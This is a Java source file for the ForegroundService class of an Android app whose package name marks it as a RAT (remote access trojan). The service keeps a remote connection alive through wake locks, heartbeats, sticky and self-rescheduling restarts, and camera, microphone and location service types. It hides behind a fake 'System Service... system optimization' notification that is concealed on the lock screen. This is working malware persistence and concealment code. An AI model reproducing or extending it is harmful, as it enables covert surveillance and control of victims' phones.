package com.fly0rakoon.rat.services;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.graphics.BitmapFactory;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import com.fly0rakoon.rat.MainActivity;
import com.fly0rakoon.rat.R;
import com.fly0rakoon.rat.utils.Constants;

public class ForegroundService extends Service {
    
    private static final String TAG = "ForegroundService";
    private static final String CHANNEL_ID = "fly0rakoon_channel";
    private static final int NOTIFICATION_ID = 1337;
    private static final int RESTART_DELAY = 5000; // 5 seconds
    
    private ConnectionManager connectionManager;
    private PowerManager.WakeLock wakeLock;
    private Handler backgroundHandler;
    private HandlerThread handlerThread;
    private boolean isRunning = false;
    private int restartAttempts = 0;
    private static final int MAX_RESTART_ATTEMPTS = 10;

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "Service creating...");

        try {
            // Create a dedicated handler thread for background tasks
            handlerThread = new HandlerThread("ForegroundServiceThread");
            handlerThread.start();
            backgroundHandler = new Handler(handlerThread.getLooper());

            // Acquire wake lock to keep CPU running (extended time)
            acquireWakeLock();

            // Create notification channel for Android O+
            createNotificationChannel();

            // Start as foreground service
            startAsForeground();

            // Initialize connection manager
            initializeConnectionManager();

            // Schedule heartbeat to keep service alive
            scheduleHeartbeat();

            // Reset restart attempts on successful start
            restartAttempts = 0;

        } catch (Exception e) {
            Log.e(TAG, "Error in onCreate: " + e.getMessage());
            scheduleRestart();
        }
    }

    private void acquireWakeLock() {
        try {
            PowerManager powerManager = (PowerManager) getSystemService(Context.POWER_SERVICE);
            if (powerManager != null) {
                wakeLock = powerManager.newWakeLock(
                    PowerManager.PARTIAL_WAKE_LOCK |
                    PowerManager.ACQUIRE_CAUSES_WAKEUP |
                    PowerManager.ON_AFTER_RELEASE,
                    "Fly0Rakoon::ForegroundServiceWakeLock"
                );
                if (wakeLock != null) {
                    wakeLock.acquire(30 * 60 * 1000L); // 30 minutes
                    Log.d(TAG, "Wake lock acquired");
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error acquiring wake lock: " + e.getMessage());
        }
    }

    private void initializeConnectionManager() {
        try {
            Log.d(TAG, "Initializing ConnectionManager...");
            connectionManager = new ConnectionManager();
            connectionManager.onCreate();
            Log.d(TAG, "ConnectionManager initialized successfully");

            // Start connection in background
            if (backgroundHandler != null) {
                backgroundHandler.postDelayed(() -> {
                    try {
                        connectionManager.start();
                        isRunning = true;
                        Log.d(TAG, "ConnectionManager started successfully");
                    } catch (Exception e) {
                        Log.e(TAG, "Error starting ConnectionManager: " + e.getMessage());
                        scheduleRestart();
                    }
                }, 2000);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error initializing ConnectionManager: " + e.getMessage());
            scheduleRestart();
        }
    }

    private void startAsForeground() {
        try {
            Notification notification = createNotification();

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                startForeground(NOTIFICATION_ID, notification, 
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC |
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION |
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA |
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE);
            } else {
                startForeground(NOTIFICATION_ID, notification);
            }
            Log.d(TAG, "Started as foreground service");
        } catch (Exception e) {
            Log.e(TAG, "Error starting as foreground: " + e.getMessage());
        }
    }
    
    private Notification createNotification() {
        Intent notificationIntent = new Intent(this, MainActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(
            this, 
            0, 
            notificationIntent,
            PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE
        );

        NotificationCompat.Builder builder = new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Service")
            .setContentText("Maintaining system optimization...")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setContentIntent(pendingIntent)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .setAutoCancel(false)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET); // Hide on lock screen

        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) {
            builder.setLargeIcon(BitmapFactory.decodeResource(getResources(), 
                android.R.drawable.ic_dialog_info));
        }

        return builder.build();
    }
    
    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            try {
                NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "Fly0Rakoon Service",
                    NotificationManager.IMPORTANCE_LOW
                );
                channel.setDescription("Background service channel");
                channel.setShowBadge(false);
                channel.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
                channel.enableLights(false);
                channel.enableVibration(false);

                NotificationManager manager = getSystemService(NotificationManager.class);
                if (manager != null) {
                    manager.createNotificationChannel(channel);
                    Log.d(TAG, "Notification channel created");
                }
            } catch (Exception e) {
                Log.e(TAG, "Error creating notification channel: " + e.getMessage());
            }
        }
    }
        
    private void scheduleHeartbeat() {
        if (backgroundHandler == null) return;

        backgroundHandler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (isRunning) {
                    // Send heartbeat
                    if (connectionManager != null) {
                        try {
                            connectionManager.sendHeartbeat();
                            Log.d(TAG, "Heartbeat sent");
                        } catch (Exception e) {
                            Log.e(TAG, "Error sending heartbeat: " + e.getMessage());
                        }
                    }

                    // Check connection
                    if (connectionManager != null && !connectionManager.isConnected()) {
                        Log.d(TAG, "Connection lost, reconnecting...");
                        try {
                            connectionManager.reconnect();
                        } catch (Exception e) {
                            Log.e(TAG, "Error reconnecting: " + e.getMessage());
                        }
                    }

                    // Schedule next heartbeat
                    backgroundHandler.postDelayed(this, Constants.HEARTBEAT_INTERVAL);
                }
            }
        }, Constants.HEARTBEAT_INTERVAL);
    }

    private void scheduleRestart() {
        if (restartAttempts < MAX_RESTART_ATTEMPTS) {
            restartAttempts++;
            Log.d(TAG, "Scheduling restart in " + RESTART_DELAY + "ms (attempt " + restartAttempts + ")");
            
            new Handler(Looper.getMainLooper()).postDelayed(() -> {
                Log.d(TAG, "Restarting service...");
                Intent restartIntent = new Intent(this, ForegroundService.class);
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    startForegroundService(restartIntent);
                } else {
                    startService(restartIntent);
                }
            }, RESTART_DELAY);
        } else {
            Log.e(TAG, "Max restart attempts reached, giving up");
        }
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        String action = intent != null ? intent.getAction() : null;
        Log.d(TAG, "Service starting with action: " + action + ", flags: " + flags);

        if (action != null && action.equals("RESTART_SERVICE")) {
            Log.d(TAG, "Restart requested via alarm");
            if (!isRunning || connectionManager == null) {
                initializeConnectionManager();
            }
        }

        // This ensures service restarts if killed
        return START_STICKY;
    }
    
    @Override
    public void onDestroy() {
        Log.d(TAG, "Service being destroyed - attempting restart...");
        isRunning = false;

        // Stop connection manager
        if (connectionManager != null) {
            try {
                connectionManager.stop();
                Log.d(TAG, "ConnectionManager stopped");
            } catch (Exception e) {
                Log.e(TAG, "Error stopping ConnectionManager: " + e.getMessage());
            }
            connectionManager = null;
        }

        // Release wake lock
        if (wakeLock != null && wakeLock.isHeld()) {
            wakeLock.release();
            Log.d(TAG, "Wake lock released");
        }

        // Quit handler thread
        if (handlerThread != null) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR2) {
                handlerThread.quitSafely();
            } else {
                handlerThread.quit();
            }
            Log.d(TAG, "Handler thread quit");
        }

        // Schedule restart
        scheduleRestart();

        super.onDestroy();
    }
    
    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return new ForegroundBinder();
    }
    
    public class ForegroundBinder extends android.os.Binder {
        public ForegroundService getService() {
            return ForegroundService.this;
        }
    }
    
    // Public methods
    public boolean isRunning() {
        return isRunning;
    }
    
    public boolean isConnected() {
        return connectionManager != null && connectionManager.isConnected();
    }
    
    public void reconnect() {
        if (connectionManager != null && backgroundHandler != null) {
            backgroundHandler.post(() -> {
                try {
                    connectionManager.reconnect();
                    Log.d(TAG, "Reconnect attempted");
                } catch (Exception e) {
                    Log.e(TAG, "Error in reconnect: " + e.getMessage());
                }
            });
        }
    }
}
